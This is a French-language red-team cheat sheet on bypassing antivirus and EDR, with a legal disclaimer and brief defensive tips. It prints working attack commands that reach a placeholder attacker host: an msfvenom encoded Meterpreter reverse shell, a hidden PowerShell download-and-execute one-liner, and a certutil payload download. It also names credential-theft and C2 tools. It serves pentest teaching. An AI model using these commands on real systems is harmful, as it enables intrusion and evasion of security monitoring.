# Contournement d'EDR/AV (Antivirus et Endpoint Detection & Response)

> ⚠️ **Avertissement légal et éthique** :
> Les techniques décrites ici sont à but pédagogique et doivent être utilisées uniquement dans un environnement de test ou avec une autorisation explicite. Toute utilisation non autorisée est illégale et répréhensible.

## Qu'est-ce qu'un EDR/AV ?
- **AV (Antivirus)** : Logiciel qui détecte les virus connus (signatures, heuristiques).
- **EDR** : Solution avancée qui surveille le comportement, bloque les attaques, et alerte les admins.

## Pourquoi les contourner ?
- Pour tester la robustesse d'un système (Red Team, pentest)
- Pour comprendre comment les attaquants procèdent

## Techniques courantes de contournement

### 1. **Encodage et obfuscation de payloads**
- Utiliser `msfvenom` avec des encoders :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell-encoded.exe
```
- Changer le format, splitter le payload, utiliser des packers (UPX, etc.)

### 2. **Attaques fileless (sans fichier sur disque)**
- Exécuter du code directement en mémoire (PowerShell, .NET, LOLBins)
```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/payload.ps1')"
```
- Utiliser des outils comme `Invoke-Mimikatz` ou `Cobalt Strike Beacon`

### 3. **Living Off The Land (LOLbins)**
- Utiliser des binaires système pour exécuter du code malveillant
```powershell
certutil -urlcache -split -f http://attacker_ip/payload.exe payload.exe
```
- Exemples : `regsvr32`, `mshta`, `wmic`, `rundll32`

### 4. **Bypass UAC et élévation de privilèges**
- Exploiter des failles de configuration ou des binaires signés

## Bonnes pratiques de défense
- Mettre à jour les signatures et les règles comportementales
- Surveiller les outils natifs utilisés de façon anormale
- Restreindre les droits d'exécution

## Pour aller plus loin
- [PayloadsAllTheThings - AV Evasion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AV%20Evasion)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Red Team OPSEC](https://www.ired.team/offensive-security/defense-evasion)

*Cette fiche est évolutive. Propose des ajouts si tu découvres de nouvelles techniques !* 